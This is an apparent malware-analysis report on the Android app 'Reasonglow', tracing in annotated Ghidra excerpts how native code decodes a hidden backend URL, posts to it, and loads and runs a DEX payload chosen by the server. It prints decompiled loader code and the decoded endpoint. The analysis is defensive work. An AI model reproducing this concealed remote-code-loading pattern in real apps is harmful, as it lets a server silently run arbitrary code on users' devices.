# Reasonglow: remote DEX loading flow

<!-- Each section contains exactly 35 whitespace-delimited prose words. Headings and code comments are excluded. Code consists of verbatim Ghidra excerpts with added comments only. -->

## 1. Register the native entry point

JNI_OnLoad registers the native method accepting Activity and JSONObject arguments. Java startup invokes this bridge, handing the Activity into native processing. Registration resolves encrypted class, method, and signature strings before installing the native implementation pointer.

```c
// ==== JNI_OnLoad @ 0010bb40 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 139–150.
// Original Ghidra excerpt; statements, variable names, and inferred signatures are unchanged.
// Only these explanatory comments and excerpt boundaries have been added.
// 0xd070 decodes _nf06113830f5b7c33f580; 0x39fd decodes
// (Landroid/app/Activity;Lorg/json/JSONObject;)Lorg/json/JSONObject;.
// lVar4 is io/arcechomist/reasonglow/y5555xecho/Androidappapi.
// JNI +0x6b8 is RegisterNatives; LAB_0010bc9c is the registered entry.
// The Java startup caller is corroborated in 02_variant_analysis.md.
// Ghidra's extraout_* variables and incomplete helper signatures are preserved.
// Decoded strings and Java/JNI interpretations below are analyst comments,
// corroborated by the saved native analysis; they are not plaintext C literals.
      FUN_001114e8(local_60,0xd070);
      FUN_001114e8(local_70,0x39fd);
      local_88 = &DAT_001054ea;
      if (local_60[0] != (undefined *)0x0) {
        local_88 = local_60[0];
      }
      puStack_80 = &DAT_001054ea;
      if (local_70[0] != (undefined *)0x0) {
        puStack_80 = local_70[0];
      }
      local_78 = &LAB_0010bc9c;
      iVar3 = (**(code **)(*local_40 + 0x6b8))(local_40,lVar4,&local_88,1);
```

## 2. Decode the request URL

The native string decoder selects encrypted descriptors, reconstructing characters from fragments through positional transforms. Request construction decodes the destination URL, creates its Java string, constructs a URL object, and opens the connection using decoded methods.

```c
// ==== FUN_001114e8 @ 001114e8 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4575–4582.
// FUN_001116c0 selects descriptors; FUN_001114e8 reconstructs their strings.
// Ghidra omitted the selector from this inferred function signature; do not repair it here.
  plVar6 = (long *)FUN_001116c0();
  uVar20 = plVar6[3];
  uVar21 = plVar6[4];
  uVar19 = plVar6[5];
  bVar3 = *(byte *)(plVar6 + 6);
  bVar17 = *(byte *)((long)plVar6 + 0x32);
  bVar4 = *(byte *)((long)plVar6 + 0x33);
  lVar12 = plVar6[2];
```

```c
// ==== FUN_001114e8 @ 001114e8 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4606–4609.
// Positional mixing inside the original decoder, before its mode-dependent byte transform.
          uVar9 = (uVar9 ^ uVar9 >> 0x1e) * -0x40a7b892e31b1a47;
          uVar9 = (uVar9 ^ uVar9 >> 0x1b) * -0x6b2fb644ecceee15;
          uVar9 = (uVar9 ^ uVar9 >> 0x1f) >> lVar12;
          uVar8 = (int)(uVar19 >> lVar12) + uVar18 * 0x11;
```

```c
// ==== FUN_0010cdc4 @ 0010cdc4 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1027–1045.
// 0x574f decodes https://reasonglow.android-app-api.com/backend/v5/production.
// Earlier selectors: 0x7913 = java/net/URL; 0xded3 = <init>;
// 0x696f = (Ljava/lang/String;)V; 0x9141 = openConnection;
// 0x5391 = ()Ljava/net/URLConnection;.
// JNI +0x538 creates the URL string; FUN_0010ebcc wraps NewObjectV;
// FUN_0010eb90 wraps CallObjectMethodV. param_1[3] holds the connection.
    FUN_001114e8(local_80,0x574f);
    uVar11 = FUN_0010f2fc(local_80[0]);
    in_ZR = extraout_x8_03 == (undefined *)0x0;
    puVar1 = &DAT_001054ea;
    if (!(bool)in_ZR) {
      puVar1 = extraout_x8_03;
    }
    lVar8 = (**(code **)(extraout_x9_04 + 0x538))(uVar11,puVar1);
    FUN_0010f1e8(local_80);
    plVar14 = (long *)*param_1;
    lVar9 = FUN_0010ebcc(plVar14,lVar5,uVar26,lVar8);
    uVar6 = FUN_0010eb4c(param_1);
    if ((uVar6 & 1) == 0) {
      if (lVar9 == 0) {
        plVar32 = (long *)0x0;
      }
      else {
        uVar26 = FUN_0010eb90(*param_1,lVar9,uVar7);
        param_1[3] = uVar26;
```

## 3. Send the configuration POST

Request setup selects POST, configures connection timeouts, and assigns the JSON content type. It serializes the supplied JSONObject, encodes its text as UTF-8 bytes, writes those bytes into the connection output stream, and closes it.

```c
// ==== FUN_0010cdc4 @ 0010cdc4 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1202–1209.
// 0x9105 = POST. uVar13 resolves setRequestMethod(String), selected using 0x77d3.
// Earlier FUN_0010f058 calls set connect/read timeouts to 10000 milliseconds.
// 0xa320 and 0x7da6 subsequently supply Content-Type and application/json; charset=utf-8.
        FUN_001114e8(local_80,0x9105);
        plVar14 = (long *)*param_1;
        in_ZR = local_80[0] == (long *)0x0;
        if (!(bool)in_ZR) {
          plVar32 = local_80[0];
        }
        lVar9 = (**(code **)(*plVar14 + 0x538))(plVar14,plVar32);
        FUN_0010f058(*param_1,uVar26,uVar13,lVar9);
```

```c
// ==== FUN_0010cdc4 @ 0010cdc4 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1607–1625.
// param_1[2] is the caller's JSONObject; uVar26 = toString, uVar7 = getBytes.
// 0x5ec1 = UTF-8; lVar17 is the encoded request byte array.
// uVar11 = getOutputStream; uVar12 = write([B)V; uVar13 = close()V.
// The audited Java caller supplies new JSONObject(), so the observed body is {}.
          lVar15 = FUN_0010eb90(plVar14,param_1[2],uVar26);
          plVar33 = (long *)*param_1;
          FUN_001114e8(local_80,0x5ec1);
          if (local_80[0] != (long *)0x0) {
            plVar32 = local_80[0];
          }
          lVar16 = (**(code **)(*plVar33 + 0x538))(plVar33,plVar32);
          FUN_0010f1e8(local_80);
          plVar32 = (long *)*param_1;
          lVar17 = FUN_0010eb90(plVar32,lVar15,uVar7,lVar16);
          plVar27 = (long *)*param_1;
          lVar18 = FUN_0010eb90(plVar27,param_1[3],uVar11);
          uVar6 = FUN_0010eb4c(param_1);
          if ((uVar6 & 1) == 0) {
            if (lVar18 != 0) {
              FUN_0010f058(*param_1,lVar18,uVar12,lVar17);
              uVar6 = FUN_0010eb4c(param_1);
              if ((uVar6 & 1) == 0) {
                FUN_0010f058(*param_1,lVar18,uVar13);
```

## 4. Read and screen the JSON response

Response handling requires HTTP status 200, reads the connection input stream, and reconstructs response text. A JSONObject constructor parses that text for preliminary checks; accepted responses then reach the native loader with the original Activity.

```c
// ==== FUN_0010e0ac @ 0010e0ac ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1781–1785.
// uVar9 resolves getResponseCode()I; 0x3d1c decodes getInputStream.
// The stream is read through buffered Java readers into response text lVar24.
      iVar7 = FUN_0010f1ac(*param_1,param_1[3],uVar9);
      uVar11 = FUN_0010eb4c(param_1);
      uVar21 = 0x1e;
      if ((iVar7 != 200) || ((uVar11 & 1) != 0)) goto LAB_0010e190;
      FUN_001114e8(&local_90,0x3d1c);
```

```c
// ==== FUN_0010e0ac @ 0010e0ac ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1974–1978.
// param_1[0xe] = JSONObject class; param_1[0x11] = its String constructor.
// param_1[0x12] is the has(String) method used for preliminary key checks.
        lVar13 = FUN_0010ebcc(plVar12,param_1[0xe],param_1[0x11],lVar24);
        uVar11 = FUN_0010eb4c(param_1);
        if ((uVar11 & 1) == 0) {
          if (lVar13 != 0) {
            cVar5 = FUN_0010ec08(*param_1,lVar13,param_1[0x12],param_1[8]);
```

```c
// ==== FUN_0010e0ac @ 0010e0ac ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 1997–1998.
// FUN_0010f660 receives JNIEnv*, original Activity, and response string.
// A cached response can also reach this loader through FUN_0010bed8;
// this report follows the freshly fetched response path.
              FUN_0010f660(*param_1,param_1[1],lVar24);
              uVar9 = param_1[0xc];
```

## 5. Parse the response fields

The loader reparses response bytes through its native JSON parser. Decimal conversion produces outer selector 146; a fifteen-element selector table identifies required fields. Duplicate or missing fields fail validation before strings and DEX bytes materialize.

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4022–4025.
// FUN_00112550 is the native JSON parser, given text pointer, length, and allocator callbacks.
    puVar8 = (undefined8 *)
             FUN_00112550(*(undefined8 *)(param_1 + 0x10),*(undefined8 *)(param_1 + 0x18),0,
                          &local_3a8,0);
    *(undefined8 **)(param_1 + 0x20) = puVar8;
```

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4053–4054.
// 0x92 is 146; FUN_00112170 renders the outer key as decimal text.
      uVar9 = FUN_00112170(0x92,&local_a0,0x20,&local_388);
      uVar5 = local_388;
```

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4090–4098.
// DAT_00105510 contains these numeric selectors, in field order:
// 377, 585, 197, 177, 655, 270, 648, 452, 586, 288, 488, 542, 626, 629, 154.
// Following comparisons bind JSON values to these entries; field index 1 is the DEX array.
// The table contents are annotations from original ELF data, not substituted code.
          for (lVar20 = 0; lVar20 != 0xf; lVar20 = lVar20 + 1) {
            lVar18 = (&DAT_00105510)[lVar20];
            uVar9 = FUN_00112170(lVar18,auStack_280 + lVar20 * 0x20,0x20,local_300 + lVar20);
            if ((uVar9 & 1) == 0) goto LAB_00110ad0;
            lVar12 = 0;
            while (lVar20 != lVar12) {
              plVar1 = &DAT_00105510 + lVar12;
              lVar12 = lVar12 + 1;
              if (lVar18 == *plVar1) goto LAB_00110ad0;
```

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4112–4113.
// Reject duplicate matched keys before storing each value pointer.
                if (*(long *)((long)&local_380 + lVar20) != 0) goto LAB_00110ad0;
                *(ulong **)((long)&local_380 + lVar20) = puVar17 + 2;
```

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4132–4134.
// Reject missing entries: the loop only reaches its success transition when all fifteen exist.
            plVar1 = (long *)((long)&local_380 + lVar20);
            lVar20 = lVar20 + 8;
          } while (*plVar1 != 0);
```

## 6. Materialize and validate DEX bytes

Field 585 becomes a native byte buffer, with individual values bounded to 255. Before loading, the validator checks total length, DEX magic, version, headers, declared sizes, and section boundaries, rejecting malformed payloads before classloader construction.

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4212–4212.
// An array element exceeding 255 is rejected; the accepted value is stored below.
    if (0xff < uVar13) goto LAB_00110ad4;
```

```c
// ==== FUN_00110a7c @ 00110a7c ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4233–4234.
// Context +0x128 holds the DEX buffer; +0x130 holds its length.
  *(char *)(*(long *)(param_1 + 0x128) + uVar9) = (char)uVar13;
  uVar9 = uVar9 + 1;
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3224–3229.
// The caller names the resulting DEX pointer local_280 and its size local_278.
    uVar24 = FUN_00110a7c(&local_3a8);
    if ((uVar24 & 1) != 0) {
      memset(local_270,0,0x150);
      uVar24 = FUN_001110cc(local_280,local_278);
      if ((uVar24 & 1) != 0) {
        FUN_001114e8(local_3b8,0xded3);
```

```c
// ==== FUN_001110cc @ 001110cc ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4320–4322.
// Unsigned length test enforces 112..33554432 bytes (32 MiB).
  if (param_2 - 0x2000001 < 0xfffffffffe00006f) {
    return 0;
  }
```

```c
// ==== FUN_001110cc @ 001110cc ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4354–4357.
// For pre-041 DEX, declared file_size must equal actual length.
// Earlier code checks magic/version/header/endian and DEX 041 container size/offset.
      else if (param_2 != uVar5) {
        return 0;
      }
      uVar2 = *(uint *)(param_1 + 0x30);
```

```c
// ==== FUN_00111374 @ 00111374 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 4427–4439.
// The outlined helper bounds each section's offset and element count.
// Its six caller strides are 4, 4, 12, 8, 8, 32; no native checksum recomputation occurs.
  uVar1 = *(uint *)(param_1 + param_2);
  uVar2 = ((uint *)(param_1 + param_2))[1];
  if (uVar1 == 0) {
    return uVar2 == 0;
  }
  if (uVar2 < param_5 || param_4 < uVar2) {
    return false;
  }
  uVar3 = 0;
  if (param_3 != 0) {
    uVar3 = ((int)param_4 - uVar2) / param_3;
  }
  return uVar1 <= uVar3;
```

## 7. Resolve the loader class and parent

Response fields supply Class.forName and its signature, resolving the requested loader class. Separate fields select Activity.getClassLoader and its descriptor. The resulting parent loader becomes a constructor argument, while JNI checks reject incompatible classes or signatures.

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3298–3305.
// Response mappings for the verified benign contract:
// 542 -> local_2d0 = java/lang/Class (JNI FindClass, +0x30).
// 626 -> local_2c0 = forName; 629 -> local_2b0 = (Ljava/lang/String;)Ljava/lang/Class;.
// 377 -> local_380/local_378 = dalvik.system.InMemoryDexClassLoader text/length.
// +0x388 is GetStaticMethodID; FUN_0011226c builds the Java class-name string.
                    lVar17 = (**(code **)(*param_1 + 0x30))(param_1,local_2d0);
                    cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                    if ((lVar17 == 0) || (cVar12 != '\0')) goto LAB_0010fd84;
                    lVar18 = (**(code **)(*param_1 + 0x388))
                                       (param_1,lVar17,local_2c0[0],local_2b0[0]);
                    cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                    if ((lVar18 == 0) || (cVar12 != '\0')) goto LAB_0010fd84;
                    lVar19 = FUN_0011226c(param_1,local_380,local_378);
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3311–3311.
// FUN_0010f094 wraps CallStaticObjectMethodV: Class.forName(loader class string).
                    lVar17 = FUN_0010f094(param_1,lVar17,lVar18,lVar19);
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3328–3335.
// param_2 is the original Activity; +0xf8 = GetObjectClass; +0x108 = GetMethodID.
// 177 -> local_350 = getClassLoader; 655 -> local_340 = ()Ljava/lang/ClassLoader;.
// FUN_0010eb90 wraps CallObjectMethodV; returned lVar18 is the parent ClassLoader.
// Named values are the tested response's contents, not hardcoded plaintext in these calls.
                    lVar18 = (**(code **)(*param_1 + 0xf8))(param_1,param_2);
                    cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                    if ((lVar18 == 0) || (cVar12 != '\0')) goto LAB_0010fd84;
                    lVar18 = (**(code **)(*param_1 + 0x108))
                                       (param_1,lVar18,local_350[0],local_340[0]);
                    cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                    if ((lVar18 == 0) || (cVar12 != '\0')) goto LAB_0010fd84;
                    lVar18 = FUN_0010eb90(param_1,param_2,lVar18);
```

## 8. Allocate the buffer and construct the loader

Native code allocates a direct ByteBuffer matching the fetched DEX length and copies validated bytes into its memory. Response constructor fields then instantiate InMemoryDexClassLoader using that buffer and the Activity parent loader as constructor arguments.

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3366–3366.
// Earlier decoded selectors identify java/nio/ByteBuffer (0x3102),
// allocateDirect (0xce92), and (I)Ljava/nio/ByteBuffer; (0xeb08).
// This call requests local_278 bytes. JNI +0x730 obtains its direct address.
                      lVar19 = FUN_0010f094(param_1,lVar22,lVar19,local_278 & 0xffffffff);
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3385–3393.
// 154 -> local_2a0 = <init>; 197 -> local_360 =
// (Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V.
// FUN_0010ebcc wraps NewObjectV: resolved loader class, constructor ID,
// ByteBuffer lVar19, parent ClassLoader lVar18. The resulting object is lVar22.
                              memcpy(__dest,local_280,local_278);
                              uVar20 = FUN_001102f4(param_1,&local_3a8,auStack_200,lVar19,lVar18);
                              if ((uVar20 & 1) != 0) {
                                lVar22 = (**(code **)(*param_1 + 0x108))
                                                   (param_1,lVar17,local_2a0,local_360[0]);
                                cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                                bVar11 = false;
                                if ((lVar22 != 0) && (cVar12 == '\0')) {
                                  lVar22 = FUN_0010ebcc(param_1,lVar17,lVar22,lVar19,lVar18);
```

## 9. Load and instantiate the entry class

The newly created loader receives the response-selected class name through loadClass. After resolving that class, native code obtains its constructor using another response descriptor and creates an instance, preparing the object whose method will execute.

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3401–3406.
// 270 -> local_330 = loadClass; 648 -> local_320 = (Ljava/lang/String;)Ljava/lang/Class;.
// 452 -> local_310/local_308 = payload class text/length; the benign proof supplies
// com.apkdefense.fixture.webview.ResponseEntry. Names remain response-controlled.
                                    lVar26 = (**(code **)(*param_1 + 0x108))
                                                       (param_1,lVar17,local_330[0],local_320[0]);
                                    cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                                    bVar11 = false;
                                    if ((lVar26 != 0) && (cVar12 == '\0')) {
                                      lVar17 = FUN_0011226c(param_1,local_310,local_308);
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3413–3413.
// CallObjectMethodV(loader instance, loadClass method ID, entry-class string).
                                        lVar26 = FUN_0010eb90(param_1,lVar22,lVar26,lVar17);
```

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3426–3432.
// 154 -> local_2a0 = <init>; 586 -> local_300 = ()V.
// GetMethodID selects the no-argument constructor; NewObjectV creates lVar25.
                                          lVar25 = (**(code **)(*param_1 + 0x108))
                                                             (param_1,lVar26,local_2a0,local_300[0])
                                          ;
                                          cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                                          bVar11 = false;
                                          if ((lVar25 != 0) && (cVar12 == '\0')) {
                                            lVar25 = FUN_0010ebcc(param_1,lVar26,lVar25);
```

## 10. Invoke the response-selected method

Finally, response fields select the instance method and Activity parameter descriptor. JNI invokes that method on the new payload object, passing the original Activity. Our benign response selects run, displaying an interactive execution proof screen.

```c
// ==== FUN_0010f660 @ 0010f660 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 3439–3445.
// 288 -> local_2f0 = run; 488 -> local_2e0 = (Landroid/app/Activity;)V.
// The method name and descriptor are supplied by the benign response.
// lVar25 is the payload instance; param_2 remains the original Activity.
                                              lVar26 = (**(code **)(*param_1 + 0x108))
                                                                 (param_1,lVar26,local_2f0[0],
                                                                  local_2e0[0]);
                                              cVar12 = (**(code **)(*param_1 + 0x720))(param_1);
                                              bVar11 = false;
                                              if ((lVar26 != 0) && (cVar12 == '\0')) {
                                                FUN_0010f058(param_1,lVar25,lVar26,param_2);
```

```c
// ==== FUN_0010f058 @ 0010f058 ====
// Source: work/family4_reasonglow_ghidra_out/decompiled.c, lines 2536–2540.
// JNI +0x1f0 is CallVoidMethodV; the wrapper preserves the variadic arguments.
// Runtime corroboration: captures/family4/io.arcechomist.reasonglow/positive/
// button-logcat.txt records ENTRY_CALLED, UI_INSTALLED, BUTTON_EXECUTED (PID 18690).
// This proves the benign fixture's behavior, not an unseen production payload.
  pcVar1 = *(code **)(extraout_x8 + 0x1f0);
  *(undefined1 (*) [16])(unaff_x29 + -0x50) = auVar2;
  *(undefined8 *)(unaff_x29 + -0x38) = uVar4;
  *(undefined8 *)(unaff_x29 + -0x40) = uVar3;
  (*pcVar1)();
```
